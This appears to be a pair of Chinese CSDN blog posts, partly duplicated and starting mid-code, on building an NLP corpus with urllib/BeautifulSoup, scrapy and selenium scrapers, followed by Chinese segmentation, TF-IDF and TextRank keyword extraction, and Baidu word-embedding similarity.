        randdom_header = random.choice(my_headers)

        req = urllib.request.Request(url)

        req.add_header("User-Agent", randdom_header)
        req.add_header("GET", url)

        response = urllib.request.urlopen(req)

        bsObj = BeautifulSoup(response.read(), "html.parser")
    # 获取文章的文字内容
    # 获取网页信息
    #此处逻辑应为：首先获取文章box 的id 之后获取，title 的，之后是content 的
    # 将每一篇博客分别保存为一个文件
        title = bsObj.findAll(name='h1',attrs={'class':title_id})
        str_title = validateTitle(title[0].get_text() + '.txt')
        print(str_title.encode('gbk'))
        f_blog = open('blog//' + str_title, 'w', encoding='utf-8')
# 正则表达式匹配博客包含框 标签
#内容,注意此处用了bsobj 因为如果缩小范围可能找不到（第二个循环）
        for content_box in bsObj.findAll(name='div',attrs={'class':contend_box_id}):  

            for contend in bsObj.findAll(name='div',id = contend_id):

                str_content = 'content' + '\n'+ contend.get_text() + '\n'
                f_blog.write(str_content)

        f_blog.close()

        response.close()  # 注意关闭response
    except OSError as e:
        print(e)
    except urllib.error.URLError as e:
        print(e.reason)

# url = 'https://blog.csdn.net/wangyaninglm/article/details/45676169'
# #
# get_Content(url,'blog-content-box','title-article','article_content')

效果：

scrapy 与xpath
在pycharm 中调试 scrapy
from scrapy import cmdline
cmdline.execute('scrapy crawl Hospital'.split())

写好spider 的解析函数


#

class HospitalSpider(Spider):
    i = 2;
    name = 'Hospital'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    }
    jianjie = 'jianjie.html'
    base_url = 'https://yyk.99.com.cn'
    def start_requests(self):
        url = 'https://yyk.99.com.cn/city.html'
        yield Request(url, headers=self.headers)

    def parse(self, response):
        # .re(r'[\u4e00-\u9fa5]{2,4}')匹配中文字符和长度，31为表格前31个后面的值包括了英文字母排序的值
        hospitals_sub_url = response.xpath(
            '//div[@class="m-clump"]//dt/a[@href]/@href').extract()[:31]

        for url in hospitals_sub_url:
                url = str(self.base_url + url)
                yield Request(url, callback=self.parse_dir_urls)


    def parse_dir_urls(self, response):
        hospitals_sub_url = response.xpath(
            '//div[@class="m-table-2"]//td/a[@href]/@href').extract()

        for url in hospitals_sub_url:
            url = str(self.base_url + url+ self.jianjie)
            yield Request(url, callback=self.parse_dir_contents)

    def parse_dir_contents(self, response):
        item = HospitalspiderItem()

        item.item_dict['更新日期'] = response.xpath('//div[@class="crumb"]//font/text()').extract()

        #xpath：/html/body/div[6]/div[3]/div[1]/div[1]/table/tbody/tr[1]/td[4]/a
        #此表格含有tbody 标签，不是很好处理，使用跳转语法.单双斜杠都可
        item.item_dict['所在地区'] = response.xpath('//table[@class="present-table"]//tr[1]/td[4]/a/text()').extract()
        item.item_dict['简介'] = response.xpath('//div[@class="present-wrap1"]//div[@id="txtintro"]').extract()


        yield item


pipeline 对于 依次爬取的item 进行处理，此处写成csv ，参照item 类进行数据持久化
pipeline
# -*- coding: utf-8 -*-

# Define your item pipelines here
#
# Don't forget to add your pipeline to the ITEM_PIPELINES setting
# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html
import re
from HospitalSpider import items

class HospitalspiderPipeline(object):
    csv_head = items.HospitalspiderItem()
#正则表达式去除html 标签（在scrapy 爬取过程中有些标签lxml 没法解析，带着标签爬下来了）
    def clean_html(self,str):
        reg = re.compile('<[^>]*>')
        return reg.sub('', str)
#csv 增加引号
    def add_yinhao(self, str):
        if str:
            return '"' + str + '"'
        else:
            return ''
#对每一项转换成str，去除html 标签,这块的参数应该怎么写
    def write_csv_line(self, item):
        str_row = ''
        for i in item.item_list:
            if item.item_dict[i]:
                str_row = str_row + self.add_yinhao(self.clean_html(str(item.item_dict[i][0]))) + ','

        str_row = str_row.strip(',').replace('\r','').replace('\n','').replace('\t','').replace(' ','') + '\n'

        return str_row

    def __init__(self):
        pass

    def open_spider(self, spider):
        self.file = open('hospital.csv', 'w', encoding='utf-8')
        str_row = ''
        #写文件头
        for i in self.csv_head.item_list:
            str_row = str_row + '"' +i+'"'+','
        self.file.write((str_row.strip(',')+'\n'))



    def process_item(self, item, spider):


        self.file.write(self.write_csv_line(item))



    def close_spider(self, spider):
        # 关闭爬虫时顺便将文件保存退出
        self.file.close()


修改 settings.py 文件
ITEM_PIPELINES = {
   'HospitalSpider.pipelines.HospitalspiderPipeline': 300,
}

使用selenium 模拟浏览器行为

# encoding: utf-8
'''
@author: season
@contact:

@file: main.py
@time: 2018/11/16 14:24
@desc:
'''

import selenium

from selenium import webdriver
import file_operator



#此处使用chrome 复制的xpath 非常准确，因为直接使用了chrome 的webdriver



#获取每一页申请的登记号的详细信息
#str_xpath  = '//tr[contains(@style, " color:#535353")]/td[2]'
def get_Page_all_detail(handle_web_driver,str_xpath):
    list_diag_test = handle_web_driver.find_elements_by_xpath(str_xpath)
    list_Registration_number = []
    #获取所有登记号
    for element in list_diag_test:
        list_Registration_number.append(element.text)

    #已经爬取过的登记号就不爬了
    list_already_have = file_operator.all_pure_file_name_without_extension(r'./html/','.html')

    list_Registration_number = file_operator.sub_list(list_already_have,list_Registration_number)

    #找到所有的登记号的细节
    for Registration_number in list_Registration_number:
        handle_web_driver.find_element_by_link_text(Registration_number).click()
        handle_web_driver.implicitly_wait(1)
        #保存html
        with open(r'./html/'+Registration_number+'.html','w',encoding='utf-8') as html_file:
            page_html = handle_web_driver.page_source
            html_file.write(page_html)


        handle_web_driver.back()


#打开入口链接，设置相关疾病,逐页爬取，翻页
def send_click(url):

    browser = webdriver.Chrome()

    browser.get(url)
    browser.implicitly_wait(1)

    str_xpath = '//tr[contains(@style, " color:#535353")]/td[2]'

#找到共有多少页
    #// *[ @ id = "searchfrm"] / div / div[4] / div[1] / a[3]
    next_page_element_number = int(browser.find_element_by_xpath('// *[ @ id = "searchfrm"] / div / div[4] / div[1]/a[3]').text)

    for index in range(0,next_page_element_number):
        get_Page_all_detail(browser, str_xpath)
        next_button = browser.find_element_by_xpath('//input[contains(@class, "page_next ui-button ui-widget ui-state-default ui-corner-all")]')
        next_button.click()


#函数返回本页没有被爬去的页面（断点续爬）


def main():
    #设置start url 搜索内容
    str_url_base = 'http://www.search.keywords='
    str_diagnosis = '***'
    send_click(str_url_base+str_diagnosis)

if __name__ == '__main__':
    main()

新的改变
我还没写完程序，后序代码和过程逐步贴上来
主要计划是，使用我自己的博客作为语料进行，词云，tf-idf ，textrank 等算法的分析

相关链接
NLP系列文章:

自然语言处理简介（1）---- 服务梳理与传统汉语分词
深度学习与中文短文本分析总结与梳理
错误使用tf-idf的实例分享
知识图谱技术分享会----有关知识图谱构建的部分关键技术简介及思考
基于分布式的短文本命题实体识别之----人名识别（python实现）
简单NLP分析套路（1）----语料库积累之3种简单爬虫应对大部分网站
简单NLP分析套路（2）----分词，词频，命名实体识别与关键词抽取
简单NLP分析套路（3）---- 可视化展现与语料收集整理

NLP 系列文章代码

NLP_DEMO
项目介绍页面
pyltp分词模型

NLP 下载资源


pyltp分词模型下载（需要免费获取请加群探讨或直接官网下载）


算法及概念说明



未完待续










目录近期听课的思考语料库的记录3种爬虫urllib.request + BeautifulSoupscrapy 与xpath使用selenium 模拟浏览器行为新的改变相关链接未完待续
近期听课的思考
近期有机会听了听天善智能的课程《自然语言处理之AI深度学习顶级实战课程》慢慢的有一些心得，以后有机会慢慢给大家分享出来。
为什么微软称NLP 为人工智能“皇冠上的明珠”？----认知智能
深度学习在自然语言处理的通用步骤

论文的阅读，最新算法的研究
算法的大概方向的评估训练和确定
训练数据的收集，清洗以及数据的预处理
算法实现，系统设计，参数调优，模型升级
模型效果评估与部署

语料库的记录
其实对于很多公司来说，要做NLP的一个最大的问题就是语料库的积累，包括词向量，知识库等等。这些东西最好的来源是什么呢？–爬虫。
爬虫最常用的三种手段：
1.urllib.request
构造页面post 请求
2.scrapy
如果有非常详细的 网站树形结构，使用该框架爬取非常快捷方便
3.selenium
自动化测试利器，针对动态请求，url没有变化的网站类型有奇特疗效
以下分别针对上述三种爬取方式给出实例代码
3种爬虫
urllib.request + BeautifulSoup
主要思路，遍历分页列表–>获取每一页的博客链接–>依次爬取博客内容
# encoding: utf-8
'''
@author: season
@contact: 

@file: spider_for_csdn.py
@time: 2018/10/16 21:32
@desc:
'''
import io
import os
import sys
import urllib
from urllib.request import urlopen
from urllib import request
from bs4 import BeautifulSoup
import datetime
import random
import re
import requests
import socket

socket.setdefaulttimeout(5000)  # 设置全局超时函数

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='gb18030')
headers1 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'}
headers2 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36'}
headers3 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}

# 得到CSDN博客某一个分页的所有文章的链接
articles = set()


def getArticleLinks(pageUrl):
    # 设置代理IP
    # 代理IP可以上http://ip.zdaye.com/获取，此处不应该硬编码
    proxy_handler = urllib.request.ProxyHandler({'post': '49.51.195.24:1080'})
    proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
    opener = urllib.request.build_opener(urllib.request.HTTPHandler, proxy_handler)
    urllib.request.install_opener(opener)
    # 获取网页信息
    req = request.Request(pageUrl, headers=headers1 or headers2 or headers3)
    html = urlopen(req)
    bsObj = BeautifulSoup(html.read(), "html.parser")
    global articles
 # 正则表达式匹配每一篇文章链接(比较硬编码h4 这个四级标题里面藏了所有链接)
    for articlelist in bsObj.findAll("h4"): 
        # print(articlelist)
        if 'href' in articlelist.a.attrs:
            if articlelist.a.attrs["href"] not in articles:
                # 遇到了新界面
                newArticle = articlelist.a.attrs["href"]
                # print(newArticle)
                articles.add(newArticle)
                #print(newArticle)


# 得到CSDN博客某个博客主页上所有分页的链接，根据分页链接得到每一篇文章的链接并爬取博客每篇文章的文字
pages = set()


def getPageLinks(bokezhuye):
    # 设置代理IP
    # 代理IP可以上http://ip.zdaye.com/获取
    proxy_handler = urllib.request.ProxyHandler({'post': '49.51.195.24:1080'})
    proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
    opener = urllib.request.build_opener(urllib.request.HTTPHandler, proxy_handler)
    urllib.request.install_opener(opener)
    # 获取网页信息
    req = request.Request(bokezhuye, headers=headers1 or headers2 or headers3)
    html = urlopen(req)
    bsObj = BeautifulSoup(html.read(), "html.parser")
    # 获取当前页面(第一页)的所有文章的链接
    getArticleLinks(bokezhuye)
    # 去除重复的链接
    global pages
    for pagelist in bsObj.findAll("a", href=re.compile("^/([A-Za-z0-9]+)(/article)(/list)(/[0-9]+)*$")):  # 正则表达式匹配分页的链接
        if 'href' in pagelist.attrs:
            if pagelist.attrs["href"] not in pages:
                # 遇到了新的界面
                newPage = pagelist.attrs["href"]
                # print(newPage)
                pages.add(newPage)
                # 获取接下来的每一个页面上的每一篇文章的链接
                newPageLink = "http://blog.csdn.net/" + newPage
                getArticleLinks(newPageLink)
                # 爬取每一篇文章的文字内容
                for articlelist in articles:
                    newarticlelist = "http://blog.csdn.net/" + articlelist
                    print(newarticlelist)
                    getArticleText(newarticlelist)



####获取到每一个分页列表的所有文章
str_page_url_prefix = 'https://blog.csdn.net/wangyaninglm/'

list_page_str = str_page_url_prefix + 'article/list/'

#输入分页数据量,我的博客17页
for i in range(1,18):
    getPageLinks(list_page_str+ str(i))

page_url_list = []
page_url_pattern = "(" + str_page_url_prefix + "article/details)(/[0-9]+)*$"

# 把不符合的格式链接去除
for page_link in articles:

    if re.match(page_url_pattern,page_link):
        page_url_list.append(page_link)
    else:
        pass


print(len(page_url_list))

dict_page_content = {'title':'','content':''}
list_page_content = []

import spider_for_403

for url in page_url_list:
    spider_for_403.get_Content(url,'blog-content-box','title-article','article_content')



在爬取的过程中发现403报错，于是写了下面文件，更多的浏览器头
import urllib
import urllib.request
import random
from bs4 import BeautifulSoup

import urllib.error

my_headers = [
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)"
]

import re

#windows 创建文件替换特殊字符
def validateTitle(title):
    rstr = r"[\/\\\:\*\?\"\<\>\|]"  # '/ \ : * ? " < > |'
    new_title = re.sub(rstr, "_", title)  # 替换为下划线
    return new_title.replace('\r','').replace('\n','').replace('\t','')

#csdn 的网页解析
def get_Content(url,contend_box_id,title_id,contend_id):
    try:
        randdom_header = random.choice(my_headers)

        req = urllib.request.Request(url)

        req.add_header("User-Agent", randdom_header)
        req.add_header("GET", url)

        response = urllib.request.urlopen(req)

        bsObj = BeautifulSoup(response.read(), "html.parser")
    # 获取文章的文字内容
    # 获取网页信息
    #此处逻辑应为：首先获取文章box 的id 之后获取，title 的，之后是content 的
    # 将每一篇博客分别保存为一个文件
        title = bsObj.findAll(name='h1',attrs={'class':title_id})
        str_title = validateTitle(title[0].get_text() + '.txt')
        print(str_title.encode('gbk'))
        f_blog = open('blog//' + str_title, 'w', encoding='utf-8')
# 正则表达式匹配博客包含框 标签
#内容,注意此处用了bsobj 因为如果缩小范围可能找不到（第二个循环）
        for content_box in bsObj.findAll(name='div',attrs={'class':contend_box_id}):  

            for contend in bsObj.findAll(name='div',id = contend_id):

                str_content = 'content' + '\n'+ contend.get_text() + '\n'
                f_blog.write(str_content)

        f_blog.close()

        response.close()  # 注意关闭response
    except OSError as e:
        print(e)
    except urllib.error.URLError as e:
        print(e.reason)

# url = 'https://blog.csdn.net/wangyaninglm/article/details/45676169'
# #
# get_Content(url,'blog-content-box','title-article','article_content')

效果：

scrapy 与xpath
在pycharm 中调试 scrapy
from scrapy import cmdline
cmdline.execute('scrapy crawl Hospital'.split())

写好spider 的解析函数


#

class HospitalSpider(Spider):
    i = 2;
    name = 'Hospital'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
    }
    jianjie = 'jianjie.html'
    base_url = 'https://yyk.99.com.cn'
    def start_requests(self):
        url = 'https://yyk.99.com.cn/city.html'
        yield Request(url, headers=self.headers)

    def parse(self, response):
        # .re(r'[\u4e00-\u9fa5]{2,4}')匹配中文字符和长度，31为表格前31个后面的值包括了英文字母排序的值
        hospitals_sub_url = response.xpath(
            '//div[@class="m-clump"]//dt/a[@href]/@href').extract()[:31]

        for url in hospitals_sub_url:
                url = str(self.base_url + url)
                yield Request(url, callback=self.parse_dir_urls)


    def parse_dir_urls(self, response):
        hospitals_sub_url = response.xpath(
            '//div[@class="m-table-2"]//td/a[@href]/@href').extract()

        for url in hospitals_sub_url:
            url = str(self.base_url + url+ self.jianjie)
            yield Request(url, callback=self.parse_dir_contents)

    def parse_dir_contents(self, response):
        item = HospitalspiderItem()

        item.item_dict['更新日期'] = response.xpath('//div[@class="crumb"]//font/text()').extract()

        #xpath：/html/body/div[6]/div[3]/div[1]/div[1]/table/tbody/tr[1]/td[4]/a
        #此表格含有tbody 标签，不是很好处理，使用跳转语法.单双斜杠都可
        item.item_dict['所在地区'] = response.xpath('//table[@class="present-table"]//tr[1]/td[4]/a/text()').extract()
        item.item_dict['简介'] = response.xpath('//div[@class="present-wrap1"]//div[@id="txtintro"]').extract()


        yield item


pipeline 对于 依次爬取的item 进行处理，此处写成csv ，参照item 类进行数据持久化
pipeline
# -*- coding: utf-8 -*-

# Define your item pipelines here
#
# Don't forget to add your pipeline to the ITEM_PIPELINES setting
# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html
import re
from HospitalSpider import items

class HospitalspiderPipeline(object):
    csv_head = items.HospitalspiderItem()
#正则表达式去除html 标签（在scrapy 爬取过程中有些标签lxml 没法解析，带着标签爬下来了）
    def clean_html(self,str):
        reg = re.compile('<[^>]*>')
        return reg.sub('', str)
#csv 增加引号
    def add_yinhao(self, str):
        if str:
            return '"' + str + '"'
        else:
            return ''
#对每一项转换成str，去除html 标签,这块的参数应该怎么写
    def write_csv_line(self, item):
        str_row = ''
        for i in item.item_list:
            if item.item_dict[i]:
                str_row = str_row + self.add_yinhao(self.clean_html(str(item.item_dict[i][0]))) + ','

        str_row = str_row.strip(',').replace('\r','').replace('\n','').replace('\t','').replace(' ','') + '\n'

        return str_row

    def __init__(self):
        pass

    def open_spider(self, spider):
        self.file = open('hospital.csv', 'w', encoding='utf-8')
        str_row = ''
        #写文件头
        for i in self.csv_head.item_list:
            str_row = str_row + '"' +i+'"'+','
        self.file.write((str_row.strip(',')+'\n'))



    def process_item(self, item, spider):


        self.file.write(self.write_csv_line(item))



    def close_spider(self, spider):
        # 关闭爬虫时顺便将文件保存退出
        self.file.close()


修改 settings.py 文件
ITEM_PIPELINES = {
   'HospitalSpider.pipelines.HospitalspiderPipeline': 300,
}

使用selenium 模拟浏览器行为

# encoding: utf-8
'''
@author: season
@contact:

@file: main.py
@time: 2018/11/16 14:24
@desc:
'''

import selenium

from selenium import webdriver
import file_operator



#此处使用chrome 复制的xpath 非常准确，因为直接使用了chrome 的webdriver



#获取每一页申请的登记号的详细信息
#str_xpath  = '//tr[contains(@style, " color:#535353")]/td[2]'
def get_Page_all_detail(handle_web_driver,str_xpath):
    list_diag_test = handle_web_driver.find_elements_by_xpath(str_xpath)
    list_Registration_number = []
    #获取所有登记号
    for element in list_diag_test:
        list_Registration_number.append(element.text)

    #已经爬取过的登记号就不爬了
    list_already_have = file_operator.all_pure_file_name_without_extension(r'./html/','.html')

    list_Registration_number = file_operator.sub_list(list_already_have,list_Registration_number)

    #找到所有的登记号的细节
    for Registration_number in list_Registration_number:
        handle_web_driver.find_element_by_link_text(Registration_number).click()
        handle_web_driver.implicitly_wait(1)
        #保存html
        with open(r'./html/'+Registration_number+'.html','w',encoding='utf-8') as html_file:
            page_html = handle_web_driver.page_source
            html_file.write(page_html)


        handle_web_driver.back()


#打开入口链接，设置相关疾病,逐页爬取，翻页
def send_click(url):

    browser = webdriver.Chrome()

    browser.get(url)
    browser.implicitly_wait(1)

    str_xpath = '//tr[contains(@style, " color:#535353")]/td[2]'

#找到共有多少页
    #// *[ @ id = "searchfrm"] / div / div[4] / div[1] / a[3]
    next_page_element_number = int(browser.find_element_by_xpath('// *[ @ id = "searchfrm"] / div / div[4] / div[1]/a[3]').text)

    for index in range(0,next_page_element_number):
        get_Page_all_detail(browser, str_xpath)
        next_button = browser.find_element_by_xpath('//input[contains(@class, "page_next ui-button ui-widget ui-state-default ui-corner-all")]')
        next_button.click()


#函数返回本页没有被爬去的页面（断点续爬）


def main():
    #设置start url 搜索内容
    str_url_base = 'http://www.search.keywords='
    str_diagnosis = '***'
    send_click(str_url_base+str_diagnosis)

if __name__ == '__main__':
    main()

新的改变
我还没写完程序，后序代码和过程逐步贴上来
主要计划是，使用我自己的博客作为语料进行，词云，tf-idf ，textrank 等算法的分析

相关链接
NLP系列文章:

自然语言处理简介（1）---- 服务梳理与传统汉语分词
深度学习与中文短文本分析总结与梳理
错误使用tf-idf的实例分享
知识图谱技术分享会----有关知识图谱构建的部分关键技术简介及思考
基于分布式的短文本命题实体识别之----人名识别（python实现）
简单NLP分析套路（1）----语料库积累之3种简单爬虫应对大部分网站
简单NLP分析套路（2）----分词，词频，命名实体识别与关键词抽取
简单NLP分析套路（3）---- 可视化展现与语料收集整理

NLP 系列文章代码

NLP_DEMO
项目介绍页面
pyltp分词模型

NLP 下载资源


pyltp分词模型下载（需要免费获取请加群探讨或直接官网下载）


算法及概念说明



未完待续










文章大纲中文分词技术评测参考云服务哈工大语言云 ltp基于深度学习方法的中文分词一个领域细分的中文分词工具包（北大最新开源）信息检索与关键词提取TF-IDFTEXTRANKword2vectorgensim 训练词向量部分开源词向量未完待续

google 近期发布了颠覆性的NLP模型–BERT ,大家有空可以了解一下，
这是张俊林博士写的科普文章：
https://mp.weixin.qq.com/s/EPEsVzbkOdz9GovrAM-p7g
上一篇文章讲讲解了，https://blog.csdn.net/wangyaninglm/article/details/83479837
如何使用python 爬取三种类型的网站语料库，我就使用其中一种针对自己的博客进行一些简单的分析工作。
代码链接：
https://github.com/wynshiter/NLP_DEMO
主要包含以下一些内容：

分词
词频
命名实体识别
关键词抽取


中文分词技术
之前写过两篇分词相关的文章，里面简要介绍了中文分词技术，我认为汉语分词技术在深度学习之前完全是一种独立的技术手段。主要使用规则，统计或者混合的方式进行分词。
自然语言处理简介（1）---- 服务梳理与传统汉语分词
在文章，深度学习与中文短文本分析总结与梳理第三小节中
中我都曾简单介绍过中文分词技术。那么文章中提到的各类分词技术到底实战效果如何，我们就来看看
评测参考
https://blog.csdn.net/riario/article/details/78259877
云服务
哈工大语言云 ltp
准确率：
综合准确率较高，windows下安装时候坑比较多，linux 估计会好一些
文档：
https://pyltp.readthedocs.io/zh_CN/latest/api.html
github：
https://github.com/HIT-SCIR/ltp
分词例子：nlp_demo
LTP_DATA_DIR =  r'..\ltp_data_v3.4.0'  # ltp模型目录的路径
cws_model_path = os.path.join(LTP_DATA_DIR, 'cws.model')  # 分词模型路径，模型名称为`cws.model`
pos_model_path = os.path.join(LTP_DATA_DIR, 'pos.model')  # 词性标注模型路径，模型名称为`pos.model`
ner_model_path = os.path.join(LTP_DATA_DIR, 'ner.model')  # 命名实体识别模型路径，模型名称为`pos.model`
par_model_path = os.path.join(LTP_DATA_DIR, 'parser.model')  # 依存句法分析模型路径，模型名称为`parser.model`
srl_model_path = os.path.join(LTP_DATA_DIR, 'pisrl_win.model')  # 语义角色标注模型目录路径，注意windows 和linux 使用不同模型



def main():
    words = segmentor('我家在中科院，我现在在北京上学。中秋节你是否会想到李白？')

    print(roles)



# 分句，也就是将一片文本分割为独立的句子
def sentence_splitter(sentence='你好，你觉得这个例子从哪里来的？当然还是直接复制官方文档，然后改了下这里得到的。我的微博是MebiuW，转载请注明来自MebiuW！'):
    sents = SentenceSplitter.split(sentence)  # 分句
    print('\n'.join(sents))


"""分词"""
def segmentor(sentence=None):
    segmentor = Segmentor()  # 初始化实例
    segmentor.load(cws_model_path)  # 加载模型
    words = segmentor.segment(sentence)  # 分词
    #默认可以这样输出
    print ('\t'.join(words))
    # 可以转换成List 输出
    words_list = list(words)
    segmentor.release()  # 释放模型
    return words_list

安装报错参考
https://blog.csdn.net/weixin_40899194/article/details/79702468
基于深度学习方法的中文分词
https://github.com/rockyzhengwu/FoolNLTK
一个领域细分的中文分词工具包（北大最新开源）
https://github.com/lancopku/PKUSeg-python

信息检索与关键词提取
这个部分我们来介绍一些能够衡量文章中词汇重要性 的指标
早先我在做一个简单POC 的时候现学现卖了一些，那时候居然 不知道jieba 库直接提供了计算TF-IDF TEXTRANK的接口，还是找着论文自己写了一段程序实现的。
之前文章：《短文本分析----基于python的TF-IDF特征词标签自动化提取》没有写完，现在想针对NLP 的通用技术方法做一个阶段性总结：
文本被分词之后，会有如下两个问题：
其一，并不是所有的词汇都对表达文章意思有意义；
其二，一个语料库的词量是非常大的，传统的文本挖掘方法又是基于向量空间模型表示的，所以这会造成数据过于稀疏。
为了解决这两个问题一般会进行停用词过滤和关键字提取，而后者现有基于频率的TF-IDF计算方法和基于图迭代的TextRank的计算方法两种。下面看看这两种方法是怎么工作的
TF-IDF
信息检索概述
信息检索是当前应用十分广泛的一种技术，论文检索、搜索引擎都属于信息检索的范畴。通常，人们把信息检索问题抽象为：在文档集合D上，对于由关键词w[1] … w[k]组成的查询串q，返回一个按查询q和文档d匹配度 relevance (q, d)排序的相关文档列表D。
对于这一基问题，先后出现了布尔模型、向量模型等各种经典的信息检索模型，它们从不同的角度提出了自己的一套解决方案。
布尔模型以集合的布尔运算为基础，查询效率高，但模型过于简单，无法有效地对不同文档进行排序，查询效果不佳。
向量模型把文档和查询串都视为词所构成的多维向量，而文档与查询的相关性即对应于向量间的夹角。不过，由于通常词的数量巨大，向量维度非常高，而大量的维度都是0，计算向量夹角的效果并不好。另外，庞大的计算量也使得向量模型几乎不具有在互联网搜索引擎这样海量数据集上实施的可行性。
TF-IDF原理概述
如何衡量一个特征词在文本中的代表性呢？以往就是通过词出现的频率，简单统计一下，从高到低，结果发现了一堆的地得，和英文的介词in of with等等，于是TF-IDF应运而生。
TF-IDF不但考虑了一个词出现的频率TF，也考虑了这个词在其他文档中不出现的逆频率IDF，很好的表现出了特征词的区分度，是信息检索领域中广泛使用的一种检索方法。
Tf-idf算法公式以及说明:

具体实现如下所示，公式分成两项，词频*逆词频，逆词频取log值。

对于本博客进行tf-idf 关键词提取 的结果
def getTopkeyWordsTFIDF(stop_word_file_path,topK=100,content = ''):
    try:
        jieba.analyse.set_stop_words(stop_word_file_path)
        tags = jieba.analyse.extract_tags(content, topK, withWeight=True,allowPOS=('ns', 'n', 'vn', 'v'))
        for v, n in tags:
            print (v + '\t' + str((n )))
            top_word_dict_TFIDF[v] = n * 100
            #tfidf *100 作为词频
    except Exception as e:
        print(e)
    finally:
        pass


'''
算法	0.08462815202056018
图像	0.06854115641965353
数据	0.05283910802670873
文档	0.05101220109808328
使用	0.04392841012376796
函数	0.04240757682591333
查询	0.0403819432194448
匹配	0.037694924619685634
代码	0.036335922349209154
方法	0.03484516772501038
节点	0.03421192915540486
特征	0.03318907987532231
进行	0.03178994977740093
排序	0.029891585563684996
计算	0.029777524393560077
需要	0.029736538415988556
线程	0.029006587816953804
像素	0.028699044745897434
模型	0.027916255808773046
文件	0.027420392410540367
字段	0.026784762281347744
结果	0.026095752460980292
视差	0.024639602681519393
信息	0.024103853358438333
分片	0.02334856522790845
文章	0.021895636116826444
处理	0.02126962755753931
学习	0.021179099985705236
定义	0.020732334877947022
实现	0.020613687169542698
'''

TEXTRANK
TextRank 算法是一种用于文本的基于图的排序算法。其基本思想来源于谷歌的 PageRank算法, 通过把文本分割成若干组成单元(单词、句子)并建立图模型, 利用投票机制对文本中的重要成分进行排序, 仅利用单篇文档本身的信息即可实现关键词提取、文摘。和 LDA、HMM 等模型不同, TextRank不需要事先对多篇文档进行学习训练, 因其简洁有效而得到广泛应用。
TextRank 一般模型可以表示为一个有向有权图 G =(V, E), 由点集合 V和边集合 E 组成, E 是V ×V的子集。图中任两点 Vi , Vj 之间边的权重为 wji , 对于一个给定的点 Vi, In(Vi) 为 指 向 该 点 的 点 集 合 , Out(Vi) 为点 Vi 指向的点集合。点 Vi 的得分定义如下:

textRank认为一个节点如果入度多且权重大，那么这个节点越重要。
其中, d 为阻尼系数, 取值范围为 0 到 1, 代表从图中某一特定点指向其他任意点的概率, 一般取值为 0.85。使用TextRank 算法计算图中各点的得分时, 需要给图中的点指定任意的初值, 并递归计算直到收敛, 即图中任意一点的误差率小于给定的极限值时就可以达到收敛, 一般该极限值取 0.0001
def getTopkeyWordsTextRank(stop_word_file_path, topK=100, content=''):
    try:
        jieba.analyse.set_stop_words(stop_word_file_path)

        tags = jieba.analyse.textrank(content, topK, withWeight=True, allowPOS=('ns', 'n', 'vn', 'v'))
        for v, n in tags:
            print(v + '\t' + str(((n))))
            top_word_dict_TEXTRANK[v] = n * 100
            # tfidf *100 作为词频
    except Exception as e:
        print(e)
    finally:
        pass


'''
数据	1.0
进行	0.8520047479125313
算法	0.7878563717681994
使用	0.7413343451163064
图像	0.733750388302769
需要	0.6527613198715548
方法	0.5983757281819947
没有	0.5513815490421555
特征	0.5053884991210178
时候	0.5031281843586937
信息	0.4642691681828157
问题	0.45032962083226463
结果	0.4213188543199718
函数	0.41455249888086887
计算	0.41196285238282
匹配	0.4071946751633247
系统	0.382567649352275
学习	0.379993505382963
查询	0.35052867047739833
模型	0.3491924762856509
可能	0.3402092089518257
文档	0.32547879984341055
实现	0.32384145738670744
文件	0.3208866809932887
代码	0.3179633754741148
处理	0.31097955145706435
时间	0.30036400417108766
用户	0.2886245261221456
工作	0.2882269554425558
节点	0.2855624228572076
'''


word2vector
体验一下百度的word2vector，在文章:
https://blog.csdn.net/wangyaninglm/article/details/81232724
我有说过百度目前为止提供的NLP相关服务业界领先，我们来体验一下

# -*- coding:utf-8 -*-
"""@author:season@file:main.py@time:2018/6/1323:01"""

from aip import AipNlp

""" 你的 APPID AK SK """
APP_ID = ''
API_KEY = ''
SECRET_KEY = ''

client = AipNlp(APP_ID, API_KEY, SECRET_KEY)

word1 = "张飞"
dict_zhangfei = {}
word2 = "关羽"
dict_liubei = {}

""" 调用词向量表示 """
dict_zhangfei = client.wordEmbedding(word1)
print(dict_zhangfei)
dict_liubei = client.wordEmbedding(word2)
print(dict_liubei)

vector_zhangfei = dict_zhangfei['vec']
vector_liubei = dict_liubei['vec']

import numpy as np
import math
def Cosine(vec1, vec2):
    npvec1, npvec2 = np.array(vec1), np.array(vec2)
    return npvec1.dot(npvec2)/(math.sqrt((npvec1**2).sum()) * math.sqrt((npvec2**2).sum()))
# Cosine，余弦夹角

print(""" 调用词义相似度: """,client.wordSimEmbedding(word1, word2))
print("余弦相似度：",Cosine(vector_zhangfei, vector_liubei))

百度词向量其实返回的是一个1024维的词向量，而且相似度的衡量用的就是余弦相似度可以说是非常接地气了
结果：

